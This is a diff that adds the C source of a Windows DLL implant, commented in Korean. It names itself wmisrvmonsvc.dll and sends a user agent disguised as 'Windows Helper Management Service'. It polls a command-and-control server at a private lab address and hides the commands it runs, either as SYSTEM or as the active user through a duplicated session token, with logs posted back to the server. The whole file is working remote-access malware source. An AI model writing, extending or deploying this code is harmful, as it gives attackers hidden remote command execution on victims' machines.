@@ -1,0 +1,242 @@
+#include <winsock2.h>
+#include <winhttp.h>
+#include <wtsapi32.h>
+#include <windows.h>
+#include <string.h>
+#include <stdarg.h>
+#include <stdio.h>
+
+// --- 라이브러리 링크를 위한 지시자 ---
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "wtsapi32.lib")
+
+// --- C2 서버 정보 설정 ---
+#define C2_SERVER_IP L"192.168.56.1"
+#define C2_PORT 80
+#define C2_CMD_PATH L"/cmd" 
+#define C2_LOG_PATH L"/log"
+#define USER_AGENT L"Windows Helper Management Service"
+
+#define SLEEP_TIME 30000 
+#define COMMAND_BUFFER_SIZE 4096
+#define LOG_BUFFER_SIZE 1024
+
+// --- 함수 선언 ---
+void Post_Log_to_C2(const char* format, ...);
+DWORD WINAPI C2_Communication_Thread(LPVOID lpParam);
+void Execute_Command(const wchar_t* command, BOOL as_user);
+BOOL Execute_As_Logged_User(const wchar_t* command);
+
+// Winsock 상태 변수 (DllMain에서는 초기화하지 않음)
+BOOL bWinsockInitialized = FALSE;
+
+
+// --- 1. HTTP POST 로깅 함수 (Port 80 /log 경로 사용) ---
+void Post_Log_to_C2(const char* format, ...) {
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    char buffer[LOG_BUFFER_SIZE];
+    char final_log[LOG_BUFFER_SIZE + 50];
+    va_list args;
+    
+    // Winsock이 초기화되지 않았다면 로그를 보낼 수 없음
+    if (!bWinsockInitialized) return; 
+
+    // ... (로그 메시지 포맷 및 WinHttp API 호출 로직은 이전과 동일) ...
+    va_start(args, format);
+    vsnprintf(buffer, LOG_BUFFER_SIZE - 20, format, args);
+    va_end(args);
+    
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    snprintf(final_log, sizeof(final_log), "[%02d:%02d:%02d/DLL] %s", 
+             st.wHour, st.wMinute, st.wSecond, buffer);
+
+    hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) goto cleanup;
+
+    hConnect = WinHttpConnect(hSession, C2_SERVER_IP, C2_PORT, 0);
+    if (!hConnect) goto cleanup;
+
+    hRequest = WinHttpOpenRequest(hConnect, L"POST", C2_LOG_PATH, NULL,
+                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) goto cleanup;
+
+    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", (ULONG)-1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
+
+    char post_data[LOG_BUFFER_SIZE + 20];
+    snprintf(post_data, sizeof(post_data), "log_data=%s", final_log);
+    DWORD data_len = strlen(post_data);
+
+    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                       (LPVOID)post_data, data_len, data_len, 0);
+    
+cleanup: 
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+}
+
+
+// --- 2. DllMain 함수: Timeout 방지를 위해 Clean하게 수정 ---
+BOOL APIENTRY DllMain(HMODULE hModule,
+                      DWORD  ul_reason_for_call,
+                      LPVOID lpReserved)
+{
+    // SCM Timeout을 피하기 위해 복잡한 작업 없이 즉시 TRUE 반환
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hModule);
+    } else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
+        if (bWinsockInitialized) WSACleanup();
+    }
+    return TRUE;
+}
+
+
+// --- 3. Export 함수: C2 통신 시작을 위해 외부에서 호출됨 ---
+// 이 함수는 taskhost.exe가 DLL 로드 후 호출하여 C2 통신을 시작해야 합니다.
+// ServiceMain 역할을 대리합니다.
+__declspec(dllexport) void StartC2Communication() {
+    WSADATA wsaData;
+    // 1. Winsock 초기화
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        // WSAGetLastError() 등을 사용할 수 있지만, 지금은 로깅 불가로 가정
+        return; 
+    }
+    bWinsockInitialized = TRUE;
+    
+    Post_Log_to_C2("wmisrvmonsvc.dll initialized. Starting C2 thread.");
+    
+    // 2. C2 통신 스레드 시작
+    CreateThread(NULL, 0, C2_Communication_Thread, NULL, 0, NULL);
+}
+
+
+// --- 4. C2 통신 스레드 함수 (GET /cmd 경로 사용) ---
+DWORD WINAPI C2_Communication_Thread(LPVOID lpParam) {
+    // ... (이전 코드와 동일)
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    wchar_t command_buffer[COMMAND_BUFFER_SIZE] = {0};
+    
+    while (TRUE) {
+        Post_Log_to_C2("Attempting to connect to C2 for command (GET /cmd)...");
+        
+        hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!hSession) { Post_Log_to_C2("WinHttpOpen failed. Retrying."); goto cleanup; }
+
+        hConnect = WinHttpConnect(hSession, C2_SERVER_IP, C2_PORT, 0);
+        if (!hConnect) { Post_Log_to_C2("WinHttpConnect failed. Retrying."); goto cleanup; }
+
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", C2_CMD_PATH, NULL,
+                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+        if (!hRequest) { Post_Log_to_C2("WinHttpOpenRequest failed. Retrying."); goto cleanup; }
+
+        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 0, 0, 0, 0)) {
+            if (WinHttpReceiveResponse(hRequest, NULL)) {
+                // ... (명령 수신 및 파싱 로직은 이전과 동일) ...
+                DWORD dwSize;
+                if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
+                    DWORD dwBytesRead = 0;
+                    if (WinHttpReadData(hRequest, command_buffer, 
+                                        (dwSize > COMMAND_BUFFER_SIZE * sizeof(wchar_t) ? COMMAND_BUFFER_SIZE * sizeof(wchar_t) : dwSize), 
+                                        &dwBytesRead)) {
+                        
+                        command_buffer[dwBytesRead / sizeof(wchar_t)] = L'\0';
+                        
+                        if (dwBytesRead > 0) {
+                            Post_Log_to_C2("Received command: %ls", command_buffer);
+                            if (wcsstr(command_buffer, L"AS_USER:")) {
+                                wchar_t* cmd_to_exec = command_buffer + wcslen(L"AS_USER:");
+                                Execute_Command(cmd_to_exec, TRUE); 
+                            } else if (wcsstr(command_buffer, L"SYSTEM:")) {
+                                wchar_t* cmd_to_exec = command_buffer + wcslen(L"SYSTEM:");
+                                Execute_Command(cmd_to_exec, FALSE); 
+                            }
+                        }
+                    }
+                }
+            } else { Post_Log_to_C2("WinHttpReceiveResponse failed. Error: %lu", GetLastError()); }
+        } else { Post_Log_to_C2("WinHttpSendRequest failed. Error: %lu", GetLastError()); }
+        
+    cleanup:
+        if (hRequest) WinHttpCloseHandle(hRequest);
+        if (hConnect) WinHttpCloseHandle(hConnect);
+        if (hSession) WinHttpCloseHandle(hSession);
+
+        Sleep(SLEEP_TIME); 
+    }
+    return 0;
+}
+
+
+// --- 5. 명령 실행 함수 (분기 처리) ---
+// ... (Execute_Command, Execute_As_Logged_User 함수는 이전과 동일)
+void Execute_Command(const wchar_t* command, BOOL as_user) {
+    Post_Log_to_C2("Executing command: %ls (AS_USER: %s)", command, as_user ? "TRUE" : "FALSE");
+    
+    if (as_user) {
+        Execute_As_Logged_User(command);
+    } else {
+        // CreateProcessW 로직 (SYSTEM 권한으로 실행)
+        STARTUPINFOW si;
+        PROCESS_INFORMATION pi;
+        wchar_t command_copy[COMMAND_BUFFER_SIZE];
+
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        si.wShowWindow = SW_HIDE; 
+        wcscpy(command_copy, command);
+        
+        if (CreateProcessW(NULL, command_copy, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            Post_Log_to_C2("CreateProcessW successful. PID: %lu", pi.dwProcessId);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        } else {
+            Post_Log_to_C2("CreateProcessW failed. Error: %lu", GetLastError());
+        }
+    }
+}
+
+BOOL Execute_As_Logged_User(const wchar_t* command) {
+    DWORD session_id = WTSGetActiveConsoleSessionId(); 
+    HANDLE hUserToken = NULL;
+    HANDLE hDupedToken = NULL;
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    BOOL bResult = FALSE;
+
+    if (session_id == 0xFFFFFFFF) { Post_Log_to_C2("No active user session found for AS_USER execution."); goto cleanup; }
+    
+    // 1. 활성 사용자 세션의 토큰 획득
+    if (!WTSQueryUserToken(session_id, &hUserToken)) { Post_Log_to_C2("WTSQueryUserToken failed. Error: %lu", GetLastError()); goto cleanup; }
+
+    // 2. 토큰 복사
+    if (!DuplicateTokenEx(hUserToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupedToken)) { Post_Log_to_C2("DuplicateTokenEx failed. Error: %lu", GetLastError()); goto cleanup; }
+
+    // 3. STARTUPINFO 설정
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.lpDesktop = L"winsta0\\default"; 
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    // 4. CreateProcessAsUserW 호출
+    wchar_t command_copy[COMMAND_BUFFER_SIZE];
+    wcscpy(command_copy, command);
+
+    bResult = CreateProcessAsUserW(hDupedToken, NULL, command_copy, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+    if (bResult) { Post_Log_to_C2("CreateProcessAsUserW successful. PID: %lu", pi.dwProcessId); }
+    else { Post_Log_to_C2("CreateProcessAsUserW failed. Error: %lu", GetLastError()); }
+    
+cleanup:
+    if (bResult) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    if (hDupedToken) CloseHandle(hDupedToken);
+    if (hUserToken) CloseHandle(hUserToken);
+    return bResult;
+}
